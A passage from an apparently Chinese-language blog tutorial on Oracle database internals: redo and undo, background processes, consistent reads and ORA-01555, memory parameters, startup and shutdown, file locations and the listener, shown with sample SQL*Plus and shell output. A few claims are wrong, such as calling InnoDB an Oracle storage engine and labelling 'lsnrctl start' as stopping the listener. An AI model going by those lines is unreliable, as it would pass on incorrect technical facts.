object_id&#x3D;29指令中想匹配到object_id&#x3D;29的记录既可以用索引读，也可以用全表扫描，到底选用哪种执行计划需要根据代价的大小来选择。\n接下来进入数据缓存区，首次执行该数据一定不在缓存区里，也是和前面一样，先从磁盘中获取到缓存区中…\n\n到这里，查询语句将查询结果返回给用户，他的工作就结束了。但更新语句还有很多工作。\n在更新语句改写了缓存区的数据后，将启动DBWR进程将新的数据从内存刷入磁盘。进行持久化存储，否则内存断点后，数据会消失。\n日志缓存区保存了数据库相关操作的日志，记录了这个动作，然后由LGWR后台进程将其从日志缓存区这个内存区写进磁盘的日志文件里。目的很简单，就是为了便于将来出现异常情况时，可以根据日志文件中记录的动作，再继续执行一遍，从而保护数据的安全。\nOracle写日志是很重要的，LGWR进程会将日志缓存区持久化保存到日志文件。日志文件通常有多个，当第一个写满时，会写入第二个…当所有的日志文件都写满时，会重新从第一个开始覆写。所以在日志文件被覆写之前，需要将其备份出去，成为归档文件。由ARCH进程进行归档操作。\n关于提交 Commit当执行一条更新语句后，当前session再次查询是可以查询到更新后的数据的。但是其他session无法查询到更新后的，因为没有提交。\n提交 Commit 和 回滚 Rollback ，都是更新操作后，用户的确认。前者表示用户确认无误，确实需要更新；后者表示用户反悔了，撤销之前的操作。其中涉及到的细节会很多，这里只是简单描述。\nCommit操作，按照正常的逻辑，应该是执行之后，立刻被DBWR进程将更新后的数据写入磁盘，以便其他session查询到最新的数据和防止数据丢失。但事实上并非如此，因为频繁的写入操作性能较低，等数据缓存区累积到一定量时成批写入性能会更高。但这样无法兼顾数据安全。所以Commit操作之后，并不一定会立刻被DBWR进程将更新后的数据写入磁盘。很多事情都很难两全其美，和分布式系统中的CAP理论一样。但这里oracle做到了兼顾，下面来说oracle是如何做到的？\n因为oracle有日志缓存区和日志文件，在磁盘中记录了所有的操作，所以即便突然断电导致未提交的数据丢失，也可以通过日志文件重新执行之前的操作，从而恢复丢失的数据。那么数据缓存区是否越大越好呢？显然并不是，没有什么是极端的，需要从中取得平衡。数据缓存区越大，DBWR批量写入磁盘的效率越高，但断电恢复需要的时间就越长。反之也是一样\n下面介绍CKPT，什么时候将数据缓存区的数据写入磁盘是由CKPT触发的。如果更新操作的一直不提交，数据缓存区的数据会被写入磁盘中吗？答案是会的，因为DBWR将数据缓存区数据写入磁盘，不是由Commit决定的，而是由CKPT决定的。但当LGWR出现故障时，DBWR并不会听从CKPT的命令。会先等LGWR将日志缓存区的数据写入日志文件，才会完成数据缓存区写入磁盘的操作。因为凡是有记录，否则会发送数据丢失的问题。\n各主要进程总结\nPMON (Process Monitor):PMON负责监控和清理数据库实例中的失败或不响应的用户进程。当检测到一个用户进程异常终止时，PMON会执行清理工作，包括回滚未提交的事务、释放资源以及从进程表中删除相应的条目。如果遇到LGWR进程失败这样严重的问题，PMON可能会做出中止实例的激进操作，以防止数据混乱。此外，PMON还负责执行某些数据库的初始化任务，如打开监听器连接。\nSMON (System Monitor):SMON关注的是系统级的操作，而非单个进程。主要负责实例恢复工作，在数据库实例启动时执行实例恢复，包括应用联机重做日志以恢复未提交的事务，并清理实例崩溃后可能遗留的临时段。SMON还负责合并空间碎片、回收不再使用的临时段和回滚段。\nLCKn (Lock Process):LCKn是锁进程，仅用于RAC数据库。其中’n’代表编号，表示可以有多个这样的进程（最多可能有10个）。这些进程管理数据库中的锁，确保并发访问的一致性和数据完整性。它们负责授予和撤销对数据库对象的锁，以及解决锁冲突，确保多个用户或进程能够安全地并发访问数据库资源。\nRECO (Recovery Process):RECO用于处理分布式事务中的失败情况。当一个分布式事务的一部分在远程数据库中失败时，RECO会根据两阶段提交协议的记录，自动尝试完成或回滚未决的分布式事务，确保事务的原子性和一致性。\nCKPT (Checkpoint Process):用于触发DBWR从数据缓存区中写出数据到磁盘。CKPT执行越频繁，DBWR写出越频繁，DBWR写出越频繁越不能显示批量特性，性能就越低，但是数据库异常恢复的时候会越迅速。\nDBWR (Database Writer):DBWR负责将数据库缓存区缓存（Buffer Cache）中的脏数据块（已修改但尚未写入磁盘的数据）写入到数据文件中。这有助于释放缓存区空间，提高缓存命中率，并确保数据的一致性。通常，DBWR会有多个实例运行（DBW0, DBW1等），以并行处理大量I&#x2F;O操作。\nLGWR (Log Writer):LGWR负责将重做日志缓存区中的内容定期或在特定触发条件下（如事务提交、重做日志缓存区空间不足、检查点事件等）写入到在线重做日志文件中。这保证了数据库的事务可恢复性，即使在系统故障后也能恢复到一致状态。\nARCH (Archiver Process):在归档日志模式下，ARCH进程负责将已填满并归档标记的在线重做日志文件复制到归档存储位置，确保即使原始在线日志被覆盖，重做信息仍然可用，这对于数据库备份和恢复至关重要。在高负载或高可用性要求的系统中，可能有多个ARCH进程并行工作。\n\n\nRAC（Real Application Clusters）是Oracle数据库的一项技术，它允许一个数据库分布在多个服务器上，这些服务器共享相同的数据库实例，并以集群的形式协同工作。RAC架构设计的主要目标是为了提高数据库的可用性、可伸缩性和性能。在RAC环境下，数据库的数据文件、控制文件和重做日志文件等存储在共享存储设备上，所有参与集群的节点都可以访问这些共享资源。每个节点都运行着自己的Oracle实例，包含一个数据库实例进程集合，如LGWR、DBWR、CKPT等，以及前面提到的后台进程。这些实例通过高速互联（如InfiniBand网络）相互通信，协调对数据库的访问和数据修改。RAC的实施和运维相对复杂，需要仔细规划网络、存储和系统资源，以及精细的配置和管理，以确保集群的稳定运行和最佳性能。\n\nLGWR的工作就是将日志缓存区的数据写入到磁盘的REDO日志文件中。完成对更新操作的记录，可用于数据库的异常恢复。因为操作发生是有顺序的，比如建表、插入数据、删除、修改…如果建表操作没有被记录，那么后续所有的操作都无法被执行。LGWR必须顺序的记录这些操作，顺序记录才有意义。因此，LGWR是单线程的。\nLGWR有5条规则，来适应高强度的日志记录工作。\n\n每隔三秒钟，LGWR运行一次。\n任何COMMIT触发LGWR运行一次。\nDBWR要把数据从数据缓存写到磁盘，触发LGWR运行一次。\n日志缓存区满三分之一或记录满1MB,触发LGWR运行一次。\n联机日志文件切换也将触发LGWR。\n\n关于回滚 Rollback还是以 update t set object_id=92 where object_id=29; 为例。前面说过的PGA和共享池区部分省略\n\n想更新object_id&#x3D;29的记录首先就需要查到object_id&#x3D;29的记录，检查object_id&#x3D;29是否在数据缓存区里，不存在则从磁盘中读取到数据缓存区中，这一点和普通的查询语句类似。\n但是这毕竞不是查询语句而是更新语句，于是要做一件和查询语句很不同的事，在回滚表空间的相应回滚段事务表上分配事务槽，从而在回滚表空间分配到空间。该动作需要记录日志写进日志缓存区。\n在数据缓存区中创建object_id&#x3D;29的前镜像，前镜像数据也会写进磁盘的数据文件里（回滚表空间的数据文件)，从缓存区写进磁盘的规律前面已经说过了，由CKPT决定，由LGWR写入，当然也别忘记了这些动作都会记录日志，并将其写进日志缓存区，劳模LGWR还在忙着将日志缓存区的数据写入磁盘形成redo文件呢。\n前面步骤做好了，才允许将object_id&#x3D;29修改为object_id&#x3D;92,这个显然也是要记录进日志缓存区的。\n此时用户如果执行了提交，日志缓存区立即要记录这个提交信息，然后就把回滚段事务标记为非激活INACTIVE状态，表示允许重写。\n如果是执行了回滚呢，Oracle需要从回滚段中将前镜像object_id&#x3D;29的数据读出米，修改数据缓存区，完成回滚。这个过程依然要产生日志，要写数据进日志缓存区。\n\n记录前镜像为什么也需要记录日志？前镜像会记录在SGA的数据缓存区（Undohu缓存区）里，由CKPT触发LGWR数据缓存区写入磁盘。用于准备回滚的前镜像数据的生成其实和普通数据操作差不多，唯一的差别就在于一个是刷新到磁盘的普通文件里，一个是刷新到磁盘的回滚数据文件里。\n普通数据可能会出现事务已经commit，但数据还在数据缓存区中，没有被写入磁盘，数据丢失需要根据redo来进行重做恢复的场景。回滚前镜像数据也是这样，需要记录回滚前镜像数据的相关操作，来应对用户需要回滚，但回滚前镜像数据既不在内存也不在磁盘的情况（比如突然断电）此时回滚，则需要依据记录了前镜像数据的redo日志来重做一次还原前镜像数据的操作。\n下面来看回滚段的相关参数。\nSQL&gt; show parameters undoNAME                                 TYPE        VALUE------------------------------------ ----------- ------------------------------temp_undo_enabled                    boolean     FALSEundo_management                      string      AUTOundo_retention                       integer     900undo_tablespace                      string      UNDOTBS1\n\nUNDO MANAGEMETN为AUTO表示是自动回滚段管理，回滚段空间不够时可以自动扩展UNDO RETENTION为900的含义是，DML语句需要记录前镜像，当COMMIT后，表示回滚段保留的前镜像被打上了可以覆盖重新使用的标记，但是要在900秒后方可允许UNDO TABLESPACE为UNDOTBS1就不用多解释了，表示回滚段表空间的名字为UNDOTBS1\nUndo日志（回滚日志）和Redo日志（重做日志）共同确保了事务处理的ACID特性（原子性、一致性、隔离性、持久性），特别是在事务管理和数据库恢复过程中。下面详细解释两者的作用：\n\nUndo日志（回滚日志）事务回滚：Undo日志记录了事务对数据库所做的修改前的原始数据状态。当一个事务需要被回滚时（例如，事务执行失败或者用户发出了ROLLBACK命令），数据库系统会利用Undo日志来撤销事务中已经执行的所有修改，恢复数据库到事务开始前的一致状态。这一过程保证了事务的原子性，即事务中的所有操作要么全部成功，要么全部失败。多版本并发控制（MVCC）：在支持多版本并发控制的数据库（如Oracle的InnoDB存储引擎）中，Undo日志还用来提供历史版本的数据，以便在事务执行期间保持数据的一致视图。这样，即使其他事务已经修改了数据，当前事务仍能看到符合其开始时刻的数据状态，增强了并发控制的能力。\nRedo日志（重做日志）事务恢复：Redo日志记录了事务对数据库所做的所有修改操作，包括修改后的数据值、修改类型以及数据所在的位置。在系统发生故障（如电源故障、系统崩溃）之后，数据库可以使用Redo日志来“重做”那些已经完成但还未持久化到磁盘的事务操作，确保数据的持久性。即使在崩溃发生前数据尚未完全写入数据文件，也能通过重做日志恢复到崩溃前的最新状态。保证数据不丢失：Redo日志在事务提交时被写入，并且通常会先于实际数据更改持久化到磁盘，以防止在提交过程中出现故障导致的数据丢失。\n\nDML语句不同于查询语句，会改变数据库的数据。除此之外，还会产生用于将来恢复的redo和用于回退的undo。另外还有一个细节就是，由于undo也需要保护，所以还会专门产生保护undo操作的redo。\n一致读的原理查询的结果由查询的那个时刻决定了，后续数据新的变化是不予理睬的。如果不这样，Oracle每次查询的结果都可能会不一样，会导致错误的产生。比如从a向b转钱，两者的余额总和无论何时都应该是一样的。但如果在转钱之前查询余额总和，查询的过程中，钱才转到b的账户中，此时查询的最终结果肯定是错误的。因为oracle不可能回头去查变化后的数据，这样如果一直有变化产生，查询将永远不会结束。\n先介绍两个概念：\n\n系统更改号 SCN,SCN的全称是：System Change Number,这是一个只会增加不会减少的递增数字，存在于Oracle的最小单位块里，当某块改变时SCN就会递增。\n回滚段记录事务槽（）（前面我在描述回滚的时候提过，事务槽是用来分配回滚空间的)，如果你更新了某块，事务就被写进事务槽里。如果未提交或者回滚，该块就存在活动事务，数据库读到此块可以识别到这种情况的存在。\n\n当开始查询时，首先会获取查询时刻的SCN号。查询过程中会比较查询时刻的SCN号与当前数据块头部的ITL槽内的SCN号（如果有多个ITL槽，取最大的SCN号）如果查询时刻的SCN号大于ITL槽内的SCN号，说明该块的数据在这段时间没有被更新，可以放心地正常全部读。如果查询时刻的SCN号小于ITL槽内的SCN号，说明该块的数据在这段时间被更新了，需要根据ITL槽中记录的对应的undo块的地址找到undo块，将undo块中记录的修改前的数据取出。\n不过并不是查询开始的SCN大于等于查询中所有块的SCN就一定可以直接获取数据。因为当前镜像数据c从回滚段中找不回来时，这个查询将会以 ORA-01555: Snapshot too old 的错误终止。查询失败，也不会返回一个错误的查询结果。\n\nORA-01555 错误，正式名称为”Snapshot Too Old”（快照过旧），是Oracle数据库中常见的错误之一。这个错误通常发生在执行查询或事务处理期间，数据库无法为查询结果提供足够旧的一致性读取快照，导致查询失败。这意味着数据库无法确保查询结果反映的是查询开始那一刻的数据状态，违反了读一致性原则。\n触发条件：\n\nUndo表空间大小不足：如果数据库配置的Undo表空间大小较小，不足以存放长时间运行查询期间产生的undo信息，旧的undo记录可能会被新事务产生的undo信息覆盖。\n长查询与高并发更新：在查询执行过程中，如果有大量其他事务并发地对报表查询所涉及的数据表进行更新或删除操作，这将迅速消耗undo空间，可能导致查询所需的undo记录被提前清理。\nUndo_RETENTION设置不当：即使Undo表空间足够大，但如果Undo_RETENTION参数设置得过低，数据库也可能过早地回收undo信息，即使undo空间仍有空闲。\n\n解决方案：\n\n增加Undo表空间的大小。\n调整Undo_RETENTION参数以延长undo数据的保留时间。\n优化长查询，减少查询执行时间。\n使用绑定变量，减少硬解析，从而减少undo的生成。\n在合适的情况下，考虑使用较大的隔离级别，如SERIALIZABLE，尽管这可能会影响并发性能。\n\n\n早期的SQL Server的数据库版本，是读产生锁，在读数据时表就被锁住，这样确实是不存在问题了，不过如果读表会让表锁住，那数据库的并发会非常的糟糕。早期的其他数据库版本也有边读边锁的，比如已经读过的记录就允许被修改，而未读过的数据却是被锁住的，不允许修改，这虽然稍稍有些改进，只锁了表的部分而非全部，但是还是读产生锁，非常糟糕。而Oracle的回滚段，却解决了读一致性的问题，又避免了锁，大大增强了数据库并发操作的能力。\n实践内存查看 sga 内存区大小\nSQL&gt; show parameters sgaNAME                                 TYPE        VALUE------------------------------------ ----------- ------------------------------allow_group_access_to_sga            boolean     FALSElock_sga                             boolean     FALSEpre_page_sga                         boolean     TRUEsga_max_size                         big integer 1536Msga_min_size                         big integer 0sga_target                           big integer 1536M\n\n查看 pga 内存区大小\nSQL&gt; show parameters pgaNAME                                 TYPE        VALUE------------------------------------ ----------- ------------------------------pga_aggregate_limit                  big integer 2Gpga_aggregate_target                 big integer 512M\n\n查看 共享池 大小\nSQL&gt; show parameters shared_pool_sizeNAME                                 TYPE        VALUE------------------------------------ ----------- ------------------------------shared_pool_size                     big integer 0\n\n查看 数据缓存区 大小\nSQL&gt; show parameters db_cache_sizeNAME                                 TYPE        VALUE------------------------------------ ----------- ------------------------------db_cache_size                        big integer 0\n\n会发现，共享池和数据缓存区的大小都为0因为这里Oracle设置为SGA自动管理，共享池和数据缓存区的大小分配由之前的SGA MAX SIZE和SGA TARGET决定，总的大小为1536M它们分别被分配多少由Oracle来决定，无须我们人工干预，其中SGA TARGET不能大于SGA MAX SIZE。\n二者有什么差别呢？举个例子比如SGA TARGET:&#x3D;2G,而SGA MAX SIZE&#x3D;8G,表示数据库正常运行情况下操作系统只分配2G的内存区给Oracle使用，而这2G就是共享池和数据缓存区等内存组件分配的大小可是运行中发现内存不够用，这时OS可以再分配内存给SGA,但是最大不可以超过8G。\n一般情况下都建议使用SGA内存大小自动分配的原则，如果一定要手工分配也行，把SGA TARGET设置为O,再把SHARED POOL SIZE和DB CACHE SIZE设置为非O,就可以了。在启用自动管理时，数据库管理员不需要手动设置各个SGA组件（如共享池、数据缓冲区、大型池、Java池等）的确切大小。相反，管理员会设置一个总的SGA目标大小（如通过SGA_TARGET参数），或者在使用AMM时，设置一个总的内存目标大小（MEMORY_TARGET），包括SGA和PGA（Program Global Area，程序全局区）。Oracle数据库根据当前的工作负载和需求动态调整各个组件的大小，以优化资源使用和性能。\n可以使用 ipcs -m 的查看共享内存的命令：\nbash-4.4$ ipcs -m------ Shared Memory Segments --------key        shmid      owner      perms      bytes      nattch     status      0x00000000 0          oracle     600        5361664    102                     0x00000000 1          oracle     600        1593835520 51                      0x00000000 2          oracle     600        4530176    51                      0xf2c898a4 3          oracle     600        20480      51  \n\n\nipcs -m 是一个在Linux系统中用于显示内存共享段信息的命令。ipcs 命令是一个用于报告进程间通信（IPC）设施状态的实用程序，包括消息队列、信号量集和共享内存段。当加上 -m 选项时，它专门针对共享内存进行操作，显示当前系统中所有共享内存段的详细信息。共享内存是进程间通信的一种高效方式，允许多个进程直接访问同一块内存区域，从而快速交换数据。ipcs -m 输出的信息通常包括如下几列：\n\nKey：共享内存段的键值，用于标识共享内存段。\nshmid：共享内存段的ID。\nOwner：创建共享内存段的用户ID。\nPerms：共享内存段的权限。\nBytes：共享内存段的大小（字节数）。\nNattch：当前连接到该共享内存段的进程数。\nStatus：共享内存段的状态，比如是否被附加（attached）。\nctime：共享内存段创建的时间。\nmtime：共享内存段最后一次修改的时间。\n\n\n查看 日志缓存区 大小\nSQL&gt; show parameters log_bufferNAME                                 TYPE        VALUE------------------------------------ ----------- ------------------------------log_buffer                           big integer 4192K\n\n一般日志缓冲区满三分之一便会触发LGWR，将缓冲区中的内容写入磁盘，以确保有足够的空间供新的重做记录使用。\n那该如何修改这些设置呢？具体命令如下：使用 alter system set &lt;parameter_name&gt;=&lt;value&gt; scope=memory|spfile both [sid=&lt;sid_name&gt;] 命令可以动态修改许多系统参数。其中 scope 参数表示其作用范围和持久性，它有三个枚举值。\n\nmemory:只改变当前实例运行，重新启动数据库后失效。\nspfile:只改变spfile的设置，不改变当前实例运行，重新启动数据库后生效。\nboth（默认值）:同时改变实例及spfile,当前更改立即生效，重新启动数据库后仍然有效。\n\n可以通过 ALTER SYSTEM 或者导入导出来更改 spfile 的内容。针对RAC环境，ALTER SYSTEM 还可以指定SD参数，对不同实例进行不同的设置。\n\n如果当前实例使用的是pfle而非spfile,则scope&#x3D;-spfile或scope–both会产生错误\n如果实例以pfle启动，则scope的默认值为memory,若以spfile启动，则默认值为both\n有些参数（静态参数）必须重启才能生效，如log buffer\n\n进程Oracle数据库是由实例和一组数据库文件组成的，实例则是由Oracle开辟的内存区和一组后台进程组成的。\n下面登录Oracle数据库环境，来看一下这些后台进程。这里登录的环境是Linux&#x2F;UNIX环境，因为Windows环境中Oracle是多线程形式的，不好查看。而UNIX环境是多进程形式的，更方便查看。\n查看 实例名称\nSQL&gt; show parameters instance_nameNAME                                 TYPE        VALUE------------------------------------ ----------- ------------------------------instance_name                        string      FREE\n\n使用实例名称来过滤，比使用oracle更加精准。\nbash-4.4$ ps -ef|grep FREE  oracle        33       1  0 Jul16 ?        00:00:33 db_pmon_FREEoracle        37       1  0 Jul16 ?        00:00:06 db_clmn_FREEoracle        41       1  0 Jul16 ?        00:00:48 db_psp0_FREEoracle        45       1  0 Jul16 ?        00:00:52 db_vktm_FREEoracle        51       1  0 Jul16 ?        00:00:19 db_gen0_FREEoracle        55       1  0 Jul16 ?        00:00:10 db_mman_FREEoracle        61       1  0 Jul16 ?        00:00:09 db_gen2_FREEoracle        63       1  0 Jul16 ?        00:00:10 db_diag_FREEoracle        65       1  0 Jul16 ?        00:00:08 db_ofsd_FREEoracle        69       1  0 Jul16 ?        00:00:14 db_gwpd_FREEoracle        71       1  0 Jul16 ?        00:01:24 db_dbrm_FREEoracle        73       1  0 Jul16 ?        00:10:04 db_vkrm_FREEoracle        75       1  0 Jul16 ?        00:00:38 db_pman_FREEoracle        78       1  0 Jul16 ?        00:01:42 db_dia0_FREEoracle        81       1  0 Jul16 ?        00:00:28 db_dbw0_FREEoracle        83       1  0 Jul16 ?        00:00:28 db_lgwr_FREEoracle        85       1  0 Jul16 ?        00:00:54 db_ckpt_FREEoracle        87       1  0 Jul16 ?        00:00:05 db_smon_FREEoracle        90       1  0 Jul16 ?        00:00:19 db_smco_FREEoracle        96       1  0 Jul16 ?        00:00:03 db_reco_FREEoracle       102       1  0 Jul16 ?        00:00:11 db_lreg_FREEoracle       109       1  0 Jul16 ?        00:00:10 db_pxmn_FREEoracle       115       1  0 Jul16 ?        00:01:06 db_mmon_FREEoracle       117       1  0 Jul16 ?        00:01:00 db_mmnl_FREEoracle       121       1  0 Jul16 ?        00:01:55 db_bg00_FREEoracle       123       1  0 Jul16 ?        00:00:09 db_w000_FREEoracle       131       1  0 Jul16 ?        00:00:47 db_bg01_FREEoracle       137       1  0 Jul16 ?        00:00:53 db_bg02_FREEoracle       146       1  0 Jul16 ?        00:00:03 db_d000_FREEoracle       148       1  0 Jul16 ?        00:00:02 db_s000_FREEoracle       150       1  0 Jul16 ?        00:00:03 db_tmon_FREEoracle       152       1  0 Jul16 ?        00:00:08 db_rcbg_FREEoracle       159       1  0 Jul16 ?        00:00:03 db_tt00_FREEoracle       162       1  0 Jul16 ?        00:00:08 db_tt01_FREEoracle       166       1  0 Jul16 ?        00:00:08 db_p000_FREEoracle       254       1  0 Jul16 ?        00:00:03 db_aqpc_FREEoracle       381       1  0 Jul16 ?        00:19:13 db_cjq0_FREEoracle       423       1  0 Jul16 ?        00:00:04 db_qm02_FREEoracle       427       1  0 Jul16 ?        00:00:02 db_q002_FREEoracle       431       1  0 Jul16 ?        00:00:06 db_q004_FREEoracle       478       1  0 Jul16 ?        00:00:09 db_w001_FREEoracle      1007    1006  0 Jul16 ?        00:00:00 oracleFREE (DESCRIPTION=(LOCAL=YES)(ADDRESS=(PROTOCOL=beq)))oracle      4550       1  0 Jul16 ?        00:00:04 oracleFREE (LOCAL=NO)oracle     44919       1  0 Jul17 ?        00:00:00 oracleFREE (LOCAL=NO)oracle     45470       1  0 Jul17 ?        00:00:00 oracleFREE (LOCAL=NO)oracle     65331       1  0 Jul17 ?        00:00:00 oracleFREE (LOCAL=NO)oracle    120778       1  0 Jul18 ?        00:01:20 db_m005_FREEoracle    121022       1  0 Jul18 ?        00:01:20 db_m004_FREEoracle    123426       1  0 Jul18 ?        00:01:17 db_m003_FREEoracle    125755       1  0 Jul18 ?        00:01:18 db_m000_FREEoracle    167946       1  0 10:41 ?        00:00:00 oracleFREE (LOCAL=NO)oracle    171135       1  0 11:58 ?        00:00:12 db_m006_FREEoracle    178882  170338  0 15:05 pts/6    00:00:00 grep FREE\n\n这里可以看到有很多前面介绍的进程，比如lgwr。LOCAL&#x3D;NO 表示非Oracle本身的进程，是通过其他用户通过监听连接进数据库进行访问的。\n这里缺少了一个重要的进程，ARCH归档进程。当日志循环写入过程中会出现下一个日志已经被写过的情况，再继续写将会覆盖其内容，需要将这些即将被覆盖的内容写出到磁盘里去形成归档文件。这样日志记录不会丢失，将来数据库就可以从这些日志文件和归档文件中进行数据库的恢复处理。不过这个归档并非总是必要的。\nSQL&gt; archive log list Database log mode              No Archive ModeAutomatic archival             DisabledArchive destination            /opt/oracle/product/23ai/dbhomeFree/dbs/archOldest online log sequence     8Current log sequence           6\n\n可以看到 No Archive Mode 数据库归档是关闭的。更改数据库归档模式需要重启数据库，将数据库置于mount状态后，输入alter database archivelog(如果是归档改为非归档，这里是alter database noarchivelog)然后再开启数据库alter database open,才可以将数据库更改为非归档，具体步骤如下（这里就不一一执行了）：\n\nSQL&gt; shutdown immediate;  – 关闭数据库\nstartup mount; – 启动数据库实例，并将数据库装载（mount）到实例中，但不打开（open）数据库。\nalter database archivelog; – 将数据库从非归档模式转换为归档模式\nalter database open; – 打开数据库\n\n启停参数文件及控制文件和数据库的启动与关闭是息息相关的，数据库的启动可分为三个阶段，分别是nomount、mount和open。在启动的过程中可以直接输入startup启动，也可以分成startup nomount、startup mount和alter database open三步分别启动。\n\nSTARTUP NOMOUNT：\n\n此阶段初始化Oracle实例，但不装载数据库的任何数据文件或控制文件。主要用于配置参数、分配内存结构等初始化工作。\n读取参数文件（PFILE&#x2F;SPFILE），分配SGA（系统全局区），启动后台进程。\n\n\nSTARTUP MOUNT：\n\n装载数据库但不打开。此时，控制文件被读取，数据库结构被识别，但数据文件保持关闭状态。\n除了NOMOUNT阶段的工作，还会装载控制文件，验证数据文件和联机重做日志文件的存在和一致性。\n\n\nALTER DATABASE OPEN：\n\n打开数据库，使其对用户可用。数据文件被打开，检查点信息被处理，必要时进行恢复操作。\n打开数据文件，应用重做日志以确保数据的一致性，启动必要的后台进程，解锁数据库供用户访问。\n\n\nSTARTUP RESTRICT（可选）：\n\n以受限模式打开数据库，仅允许特定用户（如DBA）连接，常用于维护操作。\n类似OPEN，但限制了连接数据库的用户权限。\n\n\nSTARTUP FORCE（可选）：\n\n强制关闭数据库（如果已打开）并重新启动。适用于数据库不能正常关闭的情况。\n相当于执行了SHUTDOWN ABORT followed by STARTUP。\n\n\n\n总结起来，nomount阶段仅需一个参数文件即可成功，mount阶段要能够正常读取到控制文件才能成功。而opn阶段需要保证所有的数据文件和日志文件等需要和控制文件里记录的名称和位置一致，能被锁定访问更新的同时还要保证没有损坏，否则数据库的ope阶段就不可能成功。\n关闭是启动的逆过程首先把数据库关闭，然后数据库和实例之间DISMOUNT，最后实例关闭。这里三个阶段都在一个命令中完成，如下：\n\nSHUTDOWN NORMAL：\n\n平缓关闭数据库，等待所有用户断开连接后才关闭，确保数据完整性和一致性。\n阻止新连接，等待当前所有会话完成，执行检查点，关闭数据库和实例。\n\n\nSHUTDOWN TRANSACTIONAL：\n\n类似于NORMAL，但在所有事务结束前不等待长时间运行的查询。\n比NORMAL更快关闭，但保证所有事务完成。\n\n\nSHUTDOWN IMMEDIATE：\n\n立即关闭，不等待用户会话完成，但允许当前事务完成。\n终止所有非系统会话，允许当前事务快速提交或回滚后关闭。\n\n\nSHUTDOWN ABORT：\n\n紧急关闭，不执行任何清理工作，可能导致未提交的事务丢失和需要实例恢复。\n立即终止所有会话，不执行检查点或事务回滚，可能导致数据库需要恢复。\n\n\n\n文件没有参数文件，实例无法创建，数据库无法NOMOUNT成功没有控制文件，数据库无法 MOUNT没有数据文件，数据库无法打开使用（此外没有了数据文件，那数据也没地方保存了，数据库也失去意义了)没有日志和归档文件，数据库就失去了保护伞，变得很不安全了。\n参数文件位置\nSQL&gt; show parameters spfileNAME                                 TYPE        VALUE------------------------------------ ----------- ------------------------------spfile                               string      /opt/oracle/product/23ai/dbhom                                                 eFree/dbs/spfileFREE.ora\n\n控制文件位置\nSQL&gt; show parameters controlNAME                                 TYPE        VALUE------------------------------------ ----------- ------------------------------control_file_record_keep_time        integer     7control_files                        string      /opt/oracle/oradata/FREE/contr                                                 ol01.ctl, /opt/oracle/oradata/                                                 FREE/control02.ctlcontrol_management_pack_access       string      DIAGNOSTIC+TUNINGdiagnostics_control                  string      IGNORE\n\n数据文件位置\nSQL&gt; select file_name from DBA_DATA_FILES;FILE_NAME--------------------------------------------------------------------------------/opt/oracle/oradata/FREE/users01.dbf/opt/oracle/oradata/FREE/undotbs01.dbf/opt/oracle/oradata/FREE/system01.dbf/opt/oracle/oradata/FREE/sysaux01.dbf\n\n日志文件位置\nSQL&gt; select group#,member from v$logfile;    GROUP# MEMBER---------- ----------------------------------------------------------------------         3 /opt/oracle/oradata/FREE/redo03.log         2 /opt/oracle/oradata/FREE/redo02.log         1 /opt/oracle/oradata/FREE/redo01.log\n\n归档文件位置（这里未开启归档模式，所以没有归档文件）\nSQL&gt; show parameters recoveryNAME                                 TYPE        VALUE------------------------------------ ----------- ------------------------------_instance_recovery_bloom_filter_size integer     1048576db_recovery_auto_rekey               string      ONdb_recovery_file_dest                stringdb_recovery_file_dest_size           big integer 0recovery_parallelism                 integer     0remote_recovery_file_dest            stringtransaction_recovery                 string      ENABLED\n\n告警日志文件\nSQL&gt; show parameters dumpNAME                                 TYPE        VALUE------------------------------------ ----------- ------------------------------background_core_dump                 string      partialbackground_dump_dest                 string      /opt/oracle/product/23ai/dbhom                                                 eFree/rdbms/logcore_dump_dest                       string      /opt/oracle/diag/rdbms/free/FR                                                 EE/cdumpmax_dump_file_size                   string      32Mshadow_core_dump                     string      partialuser_dump_dest                       string      /opt/oracle/product/23ai/dbhom                                                 eFree/rdbms/log\n\n监听如果想在远程A机器上通过网络访问本地B机器上的数据库，B机器上的数据库必须开启监听。远程的A机器只需安装数据库客户端，然后通过读取A机器上数据库客户端配置的TNSNAMES.ORA的配置文件，即可连接并访问B机器的数据库。下面介绍监听状态的查看，监听的开启，以及监听的关闭。以下Isnrctl status命令是查看监听的状态命令，其中 Listener Parameter File 和 Listener Log File 定位了监听文件listener.ora以及对应的日志。\nbash-4.4$ lsnrctl statusLSNRCTL for Linux: Version 23.0.0.0.0 - Production on 25-JUL-2024 20:16:51Copyright (c) 1991, 2024, Oracle.  All rights reserved.Connecting to (DESCRIPTION=(ADDRESS=(PROTOCOL=IPC)(KEY=EXTPROC_FOR_FREE)))STATUS of the LISTENER------------------------Alias                     LISTENERVersion                   TNSLSNR for Linux: Version 23.0.0.0.0 - ProductionStart Date                16-JUL-2024 15:25:32Uptime                    9 days 4 hr. 51 min. 19 secTrace Level               offSecurity                  ON: Local OS AuthenticationSNMP                      OFFDefault Service           FREEListener Parameter File   /opt/oracle/product/23ai/dbhomeFree/network/admin/listener.oraListener Log File         /opt/oracle/diag/tnslsnr/oracle/listener/alert/log.xmlListening Endpoints Summary...  (DESCRIPTION=(ADDRESS=(PROTOCOL=ipc)(KEY=EXTPROC_FOR_FREE)))  (DESCRIPTION=(ADDRESS=(PROTOCOL=tcp)(HOST=0.0.0.0)(PORT=1521)))Services Summary...Service &quot;16df542da83f091ce0630500580a27e7&quot; has 1 instance(s).  Instance &quot;FREE&quot;, status READY, has 1 handler(s) for this service...Service &quot;FREE&quot; has 1 instance(s).  Instance &quot;FREE&quot;, status READY, has 1 handler(s) for this service...Service &quot;FREEXDB&quot; has 1 instance(s).  Instance &quot;FREE&quot;, status READY, has 1 handler(s) for this service...Service &quot;PLSExtProc&quot; has 1 instance(s).  Instance &quot;PLSExtProc&quot;, status UNKNOWN, has 1 handler(s) for this service...Service &quot;freepdb1&quot; has 1 instance(s).  Instance &quot;FREE&quot;, status READY, has 1 handler(s) for this service...The command completed successfully\n\n关闭监听 lsnrctl stop关闭监听 lsnrctl start\n体会 sql 性能差异未优化前，单车速度使用以下存储过程，实现将1到10万插入到t表中。\ncreate or replace procedure proc1asbegin    for i in 1..100000        loop            execute immediate                &#x27;insert into t values (&#x27;||i||&#x27;)&#x27;;            commit;        end loop;end;-- 这里要记得先预先执行一遍，将过程创建起来！\n\n初始化表结构、清空共享池、开启计时等。每次执行存储过程前重置，以便观察各个存储的性能。后续省略\nSQL&gt; drop table t purge;Table dropped.Elapsed: 00:00:00.45SQL&gt; create table t(x int);Table created.Elapsed: 00:00:00.15SQL&gt; alter system flush shared_pool;System altered.Elapsed: 